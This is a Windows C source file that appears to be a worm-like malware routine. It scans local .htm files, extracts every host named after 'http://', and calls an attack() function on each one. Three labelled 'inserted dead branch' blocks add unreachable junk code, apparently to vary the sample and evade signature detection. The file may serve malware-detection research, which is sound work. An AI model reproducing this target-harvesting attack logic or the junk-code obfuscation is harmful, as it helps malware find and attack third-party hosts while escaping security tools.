#include "data_globals.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

void search(LPCSTR path) {
    WIN32_FIND_DATAA wfd;
    HANDLE hFind, hFile;
    DWORD bytesread;
    char *buf, *p, *host;
    DWORD size;

    // --- INSERTED DEAD BRANCH 1 (after declarations, Pattern A, Category A) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char username[256];
        DWORD userLen = sizeof(username);
        GetUserNameA(username, &userLen);
        char compname[256];
        DWORD compLen = sizeof(compname);
        GetComputerNameA(compname, &compLen);
        volatile unsigned long sum = 0;
        for (int k = 0; k < 5; k++) {
            sum += (si.dwNumberOfProcessors + st.wHour) ^ username[k % 10];
        }
        char dummyBuf[64];
        memset(dummyBuf, 0, sizeof(dummyBuf));
        (void)sum;
        (void)compname;
    }

    if (!SetCurrentDirectoryA(path)) return;

    hFind = FindFirstFileA("*.htm*", &wfd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    // --- INSERTED DEAD BRANCH 2 (before do-while loop, Pattern B, Category B) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        // Memory & String operations
        const char *prefix = "scan_";
        size_t len = strlen(prefix) + strlen(path) + 1;
        char *tmp = (char *)malloc(len);
        if (tmp) {
            strcpy(tmp, prefix);
            strcat(tmp, path);
            volatile size_t l = strlen(tmp);
            char *copy = (char *)malloc(l + 1);
            if (copy) {
                memcpy(copy, tmp, l + 1);
                volatile int cmp = (copy[0] == 's') ? 1 : 0;
                memset(copy, 0, l + 1);
                free(copy);
            }
            free(tmp);
        }
        char dummy[64];
        memset(dummy, 0xAA, sizeof(dummy));
        (void)dummy;
    }

    do {
        hFile = CreateFileA(wfd.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); continue; }

        buf = (char *)malloc(size + 1);
        if (!buf) { CloseHandle(hFile); continue; }

        if (!ReadFile(hFile, buf, size, &bytesread, NULL) || bytesread != size) {
            free(buf);
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);
        buf[size] = '\0';

        p = buf;
        while (*p) {
            char *http = strstr(p, "http://");
            if (!http) break;
            host = http + 7;                // skip "http://"
            p = strchr(host, '/');
            if (!p) break;
            *p = '\0';                      // terminate at slash
            attack(host);
            p++;                            // move past the slash
        }
        free(buf);
    } while (FindNextFileA(hFind, &wfd));

    // --- INSERTED DEAD BRANCH 3 (before return, Pattern C, Category C) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile unsigned char arr[32];
        for (int j = 0; j < 32; j++) {
            arr[j] = (unsigned char)(j ^ 0x55);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int j = 0; j < 32; j++) {
            hash ^= arr[j];
            hash *= 0x01000193;
        }
        volatile unsigned int result = hash;
        for (int k = 0; k < 4; k++) {
            result = (result << 1) ^ (result >> 31);
        }
        char discard[16];
        memset(discard, (char)(result & 0xFF), sizeof(discard));
        (void)result;
    }

    FindClose(hFind);
}
